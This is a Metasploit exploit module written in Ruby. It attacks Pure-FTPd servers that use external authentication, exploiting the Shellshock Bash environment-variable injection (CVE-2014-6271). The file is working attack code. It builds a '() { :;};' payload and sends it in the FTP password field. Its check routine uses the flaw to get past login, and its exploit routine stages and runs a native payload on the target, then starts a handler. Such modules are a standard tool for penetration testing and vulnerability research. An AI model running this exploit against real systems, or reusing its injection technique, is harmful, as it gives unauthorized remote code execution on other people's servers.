##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::Ftp
  include Msf::Exploit::CmdStager
 
  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Pure-FTPd External Authentication Bash Environment Variable Code Injection',
      'Description'     => %q(
        This module exploits the code injection flaw known as shellshock which
        leverages specially crafted environment variables in Bash. This exploit
        specifically targets Pure-FTPd when configured to use an external
        program for authentication.
      ),
      'Author'          =>
        [
          'Stephane Chazelas', # Vulnerability discovery
          'Frank Denis', # Discovery of Pure-FTPd attack vector
          'Spencer McIntyre' # Metasploit module
        ],
      'References'      =>
        [
          ['CVE', '2014-6271'],
          ['OSVDB', '112004'],
          ['EDB', '34765'],
          ['URL', 'https://gist.github.com/jedisct1/88c62ee34e6fa92c31dc']
        ],
      'Payload'         =>
        {
          'DisableNops' => true,
          'Space'       => 2048
        },
      'Targets'         =>
        [
          [ 'Linux x86',
            {
              'Platform'        => 'linux',
              'Arch'            => ARCH_X86,
              'CmdStagerFlavor' => :printf
            }
          ],
          [ 'Linux x86_64',
            {
              'Platform'        => 'linux',
              'Arch'            => ARCH_X86_64,
              'CmdStagerFlavor' => :printf
            }
          ]
        ],
      'DefaultOptions' =>
        {
          'PrependFork' => true
        },
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Sep 24 2014'))
    register_options(
      [
        Opt::RPORT(21),
        OptString.new('RPATH', [true, 'Target PATH for binaries used by the CmdStager', '/bin'])
      ], self.class)
    deregister_options('FTPUSER', 'FTPPASS')
  end
 
  def check
    # this check method tries to use the vulnerability to bypass the login
    username = rand_text_alphanumeric(rand(20) + 1)
    random_id = (rand(100) + 1)
    command = "echo auth_ok:1; echo uid:#{random_id}; echo gid:#{random_id}; echo dir:/tmp; echo end"
    if send_command(username, command) =~ /^2\d\d ok./i
      return CheckCode::Safe if banner !~ /pure-ftpd/i
      disconnect
 
      command = "echo auth_ok:0; echo end"
      if send_command(username, command) =~ /^5\d\d login authentication failed/i
        return CheckCode::Vulnerable
      end
    end
    disconnect
 
    CheckCode::Safe
  end
 
  def execute_command(cmd, _opts)
    cmd.gsub!('chmod', "#{datastore['RPATH']}/chmod")
    username = rand_text_alphanumeric(rand(20) + 1)
    send_command(username, cmd)
  end
 
  def exploit
    # Cannot use generic/shell_reverse_tcp inside an elf
    # Checking before proceeds
    if generate_payload_exe.blank?
      fail_with(Failure::BadConfig, "#{peer} - Failed to store payload inside executable, please select a native payload")
    end
 
    execute_cmdstager(linemax: 500)
    handler
  end
 
  def send_command(username, cmd)
    cmd = "() { :;}; #{datastore['RPATH']}/sh -c \"#{cmd}\""
    connect
    send_user(username)
    password_result = send_pass(cmd)
    disconnect
    password_result
  end
end
